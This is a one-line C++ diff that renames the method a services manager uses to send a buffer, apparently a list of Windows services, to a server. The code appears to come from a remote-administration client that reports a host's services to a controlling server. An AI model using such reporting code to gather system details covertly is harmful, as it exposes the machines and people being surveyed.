@@ -26,7 +26,7 @@ VOID CServicesManager::SendServicesList()
 	if (szBuffer == NULL)
 		return;	
 
-	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
+	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
 	LocalFree(szBuffer);
 }
 
